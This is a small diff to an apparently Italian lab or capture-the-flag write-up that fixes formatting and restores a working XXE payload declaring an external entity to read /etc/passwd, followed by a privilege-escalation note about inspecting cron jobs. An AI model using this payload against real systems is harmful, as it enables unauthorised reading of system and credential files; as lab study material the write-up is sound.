@@ -11,19 +11,19 @@
 <h2><strong>scarica il laboratorio</strong></h2>
 
 <details>
-    <summary><li>🌄 expland to clicl here</li></summary>
+    <summary><strong>🌄 expland to clicl here</strong></summary>
 
     ```xml
-    xml version="1.0" encoding="UTF-8"
-    DOCTYPE foo [ ENTITY xxe SYSTEM "file:///etc/passwd" ]
-    foo &xxe; /foo
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    <foo>&xxe;</foo>
     ```
 </details>
 
 #### Privilege escalation
 
 <details>
-    <summary><li>🌄Click to expand</li></summary>
+    <summary><strong>🌄Click to expand</strong></summary>
 
 - [x] Una volta dentro con ssh controlla il cronjob.
 - [x] Ad ogni minuto c'e sempre una sorpresa in `/etc/cron.d`
